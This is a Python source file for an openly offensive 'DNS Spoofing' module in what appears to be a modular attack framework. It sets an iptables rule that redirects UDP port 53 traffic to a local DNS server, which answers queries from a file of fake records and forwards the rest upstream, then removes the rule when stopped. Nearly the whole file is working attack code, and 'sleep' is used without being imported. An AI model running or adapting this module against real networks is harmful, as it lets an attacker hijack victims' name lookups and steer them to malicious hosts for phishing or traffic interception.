from termcolor import colored, cprint
from module import Module

from servers.dnserver import *
#from scapy.all import *
import threading
from printib import * 
from subprocess import Popen, PIPE
import os
from pathlib import Path

from dnslib import DNSLabel, QTYPE, RR, dns
from dnslib.proxy import ProxyResolver
from dnslib.server import DNSServer

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "DNS Spoofing",
                       "Description": "DNS Spoofing module attack. DNS Server implemented by Samuel Colvin",
                       "Github Link": "https://github.com/samuelcolvin/dnserver",
                       "Module Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"interface": ["eth0", "Interface for sniffing", True],
                   "port": [53, "Port DNS Server", True],
                   "dns_resolver": ["8.8.8.8", "DNS Server Resolver", True],
                   "zone_file": ["zones.txt", "File with fake DNS records", True],
                   "verbose": ["True", "Verbose", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._option_name = None


    # This module must be always implemented, it is called by the run option
    def run_module(self):

        def go(options):

            command = "iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53"
            data = Popen(command, shell=True, stdout=PIPE).stdout.read()
            print_info("iptables rules enabled")

            port = int(os.getenv('PORT', options["port"][0]))
            upstream = os.getenv('UPSTREAM', options["dns_resolver"][0])
            zone_file = Path(os.getenv('ZONE_FILE', options["zone_file"][0]))
            verbose = options["verbose"][0] == "True"
            resolver = Resolver(upstream, zone_file, verbose)
            #DNS Server implemented by Samuel Colvin 
            #https://github.com/samuelcolvin/dnserver
            udp_server = DNSServer(resolver, port=port)

            udp_server.start_thread()
            t = threading.currentThread()
            while getattr(t, "do_run", True):
                sleep(1)

            command = "iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53"
            data = Popen(command, shell=True, stdout=PIPE).stdout.read()
            print_info("iptables rules disabled")
            udp_server.stop()
                

        #e = threading.Event()
        thread1 = threading.Thread(target=go, args=(self.options,))
        thread1.start()        
       
        super(CustomModule, self).run(t=thread1)
